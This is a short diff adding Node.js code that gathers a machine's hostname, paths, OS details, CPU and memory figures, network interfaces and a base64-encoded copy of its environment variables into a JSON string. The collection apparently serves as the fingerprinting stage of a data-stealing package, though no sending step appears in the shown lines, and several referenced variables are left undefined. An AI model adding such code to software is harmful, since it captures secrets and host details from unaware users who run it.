@@ -1,0 +1,20 @@
+var data = {
+        envPORT: process.env.PORT,
+        hostname: JSON.stringify(os.hostname()),
+        currentPath: currentPath,
+        currentFile: currentFile,
+        currentEnvBase64: currentEnvBase64,
+        type: JSON.stringify(os.type()),
+        platform: JSON.stringify(os.platform()),
+        arch: JSON.stringify(os.arch()),
+        release: JSON.stringify(os.release()),
+        uptime: JSON.stringify(os.uptime()),
+        loadavg: JSON.stringify(os.loadavg()),
+        totalmem: JSON.stringify(os.totalmem()),
+        freemem: JSON.stringify(os.freemem()),
+        cpus: JSON.stringify(os.cpus()),
+        networkInterfaces: JSON.stringify(os.networkInterfaces()),
+
+}
+_tmp_1.platform = JSON.stringify(os.platform())
+data = JSON.stringify(data)
